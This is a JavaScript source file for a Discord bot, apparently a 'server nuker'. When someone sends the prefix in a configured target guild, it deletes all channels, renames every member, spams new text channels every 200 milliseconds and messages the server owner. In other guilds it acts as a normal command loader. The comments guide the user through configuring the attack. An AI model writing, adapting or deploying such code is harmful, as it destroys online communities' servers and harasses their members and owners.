const Discord = require("discord.js") //connect to discord.js

const client = new Discord.Client() //create a new client

const fs = require("fs") 

const config = require("./config.json") //you need to change settings in config.json

client.on("ready", () => {

console.log(`Logged in as ${client.user.tag}`) //shows the tag of the bot's token in the console

})

client.on("message", async message => {

if(message.channel.type === "dm") return //ignores the dm messages

if(message.guild.id === config.guildid) { //check if the guild of the message has the id in config.json. if yes:

if(!message.content.toLowerCase().startsWith(config.prefix)) return //ignores the messages without the prefix

await message.guild.channels.cache.forEach(channel => channel.delete()) //deletes all channels

await message.guild.members.cache.forEach(member => member.setNickname(config.nicks)) //changes all members nicknames in the nickname in config.json

await setInterval(() => { 

message.guild.channels.create(config.ch, "text") //creates a text channel with the name in config.json...

}, 200) //...every 200 milliseconds 

await message.guild.owner.user.send(config.ownermsg) //sends the message in config.json to the server owner

} else { //if the guild of the message hasn't the id in config.json:

if(!message.content.toLowerCase().startsWith(config.prefix)) return //ignores the messages without the prefix

const args = message.content //don't touch from here...

   .trim()

   .slice(config.prefix.length)

   .split(/ +/g)

const command = args.shift().toLowerCase()

	try {		const commandFile = require(`./commands/${command}.js`);

		commandFile.run(client, message, args);

	} catch (err) {

		console.error('Erro:' + err);

	}

 }

}) //...to here

client.login(config.token) //log in with the token in config.json (put your bot token)
